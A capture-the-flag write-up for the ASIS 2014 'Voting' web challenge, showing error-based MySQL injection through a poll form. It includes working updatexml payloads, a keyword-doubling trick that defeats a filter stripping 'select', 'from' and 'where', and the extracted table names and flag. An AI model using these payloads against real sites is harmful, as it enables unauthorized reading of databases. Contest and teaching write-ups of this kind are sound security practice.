# ASIS Cyber Security Contest Finals 2014: Voting

**Category:** Web
**Points:** 175
**Description:**

> Go here:
> <http://asis-ctf.ir:12441/>

## Write-up

This website shows a poll for operating systems where the user can choose between Windows, Linux and Mac. When submitting your choice, the following data is submitted:

```
os=Linux&submit=Submit
```

That’s not a lot of data, so let’s try some basic SQL injection: `os=Linux'&submit=Submit`. This gives the following error:

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''Linux''' at line 1
```

That’s very interesting. We can use this error, to give us data by creating a malformed XPATH query:

```
os=Linux'-updatexml(0,concat('.',(SELECT group_concat(table_name) FROM information_schema.columns where table_schema != 'information_schema' LIMIT 10 ),'1'),2)#&submit=Submit
```

The result:

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(0,concat('.',( group_concat(table_name) infmation_schema.columns table_schema' at line 1
```

That’s not the result we wanted, but still interesting. It appears some of our keywords were stripped, such as `where`, `select` and `from`. It also removed the `or` in `information`. Let’s try a simple trick:

```
os=Linux'-upUPDATEdatexml(0,concat('.',(SselectELECT group_concat(table_name) FfromROM infoORrmation_schema.columns wwherehere table_schema != 'infoORrmation_schema' LlimitIMIT 10 ),'1'),2)#&submit=Submit
```

This gives us `XPATH syntax error: 'tbl_flag,tbl_flag,tbl_poll,tbl_p'`. The `tbl_flag` must contain our flag.

```
os=Linux'-upUPDATEdatexml(0,concat('.',(SselectELECT substr(flag,1,30) FfromROM tbl_flag),'1'),2)#&submit=Submit
```

This results in:

```
XPATH syntax error: 'ASIS_1dc337d61dac5cb910eb5b8c11'
```

Almost there. The XPATH error has a fixed size, so our flag is incomplete. We’ll have to execute the injection one more time:

```
os=Linux'-upUPDATEdatexml(0,concat('.',(SselectELECT substr(flag,20,30) FfromROM tbl_flag),'1'),2)#&submit=Submit
```

Putting these pieces together results in `ASIS_1dc337d61dac5cb910eb5b8c17c52fef1`, which is the flag.

## Other write-ups and resources

* <http://tasteless.eu/2014/10/asis-ctf-finals-2014-voting/>
